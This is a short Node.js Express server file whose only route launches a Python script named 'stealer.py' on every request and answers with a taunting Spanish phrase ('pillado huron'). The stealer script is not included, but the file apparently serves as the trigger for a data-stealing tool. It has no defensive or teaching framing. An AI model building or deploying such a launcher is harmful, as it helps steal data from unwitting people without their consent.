const http = require('http');

const hostname = process.env.HOST;
const port = process.env.PORT;
const express = require('express')
var cors = require('cors');
const app = express()
const spawn = require("child_process").spawn;

app.use(cors());


app.listen(port, hostname, () => {
  console.log(`Server running at http://${hostname}:${port}/`);
});

app.get('/', (req, res) => {
  res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
  spawn('python3',["./scripts/stealer.py"]);
  res.send({uo:"pillado huron"})
})

